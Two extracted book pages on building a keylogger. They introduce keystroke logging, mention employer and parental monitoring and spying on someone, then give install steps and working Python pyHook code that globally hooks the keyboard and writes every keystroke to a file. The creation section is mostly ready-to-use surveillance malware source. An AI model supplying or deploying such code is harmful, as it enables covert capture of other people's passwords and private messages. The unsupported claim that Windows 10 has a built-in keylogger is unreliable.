  md: '# 3: Creating a simple Keylogger


    Do you know what a keylogger is? In case you do not, here is a little bit of introduction.

    Also known as keystroke logging, a keylogger is some sort of surveillance software
    that has the ability to record every keystroke made on a computer system it is
    installed in. The recording is then saved in a typically encrypted log file.

    A keylogger can record email, instant messages, and get any information typed
    anytime using the computer’s keyboard—this includes passwords, usernames, and
    other pii (personally identifiable information). The keylogger creates the log
    file and then sends it to a specific receiver. A number of keylogger programs
    also record any email addresses used as well as the URLs of the websites visited.


    # WHAT IS THE USE OF KEYLOGGERS?


    As a surveillance employers normally use keyloggers to make sure employees are
    using work computers for purposes of business only. We also have an increasing
    market of parents looking to use keyloggers to remain informed about the online
    activities of their children.

    It is rather unfortunate that some programmers embed keyloggers in spyware; this
    means it could allow the transmission of your personal information to an anonymous
    third party.'
  merge: -1
  pgno: 133
- img_proc: true
  md: "In any case, you see it (keyloggers) on the internet, and maybe even have downloaded\
    \ or installed it at some point in your life—or seen someone doing it at least—whether\
    \ to monitor or spy on someone or something like that. Windows 10 actually contains\
    \ an in-built keylogger.\n\nAs you might have already guessed though, the process\
    \ of installing this software might come with various dangerous viruses. This\
    \ is perhaps one of the reasons why creating your own is the best option.\n\n\
    Let us briefly go over the steps of creating a keylogger.\n\n# STEP 1: INSTALL\
    \ PYTHON\n\nHaving an operational python program is obvious; and unless you already\
    \ have downloaded a file with a pre-compiled keylogger, you need to install Python\
    \ alongside a couple of modules.\n\nDownload and install these modules:\n\n+ \
    \  - Latest Python version\n- [Pywin32](https://sourceforge.net/projects/pywin32/files/pywin32/)\n\
    - [PyHook](https://sourceforge.net/projects/pyhook/)\n\n# STEP 2: CREATE THE CODE\n\
    \n```\npython\nimport pyHook, pythoncom, sys, logging\n\nfile_log = 'keyloggeroutput.txt'\n\
    \ndef OnKeyboardEvent(event):\n    logging.basicConfig(filename=file_log, level=logging.DEBUG,\
    \ format='%(message)s')\n    chr(event.Ascii)\n    logging.log(10,chr(event.Ascii))\n\
    \    return True\n\nhooks_manager = pyHook.HookManager()\nhooks_manager.KeyDown\
    \ = OnKeyboardEvent\nhooks_manager.HookKeyboard()\npythoncom.PumpMessages()\n\
    ```"
  merge: -1
  pgno: 134
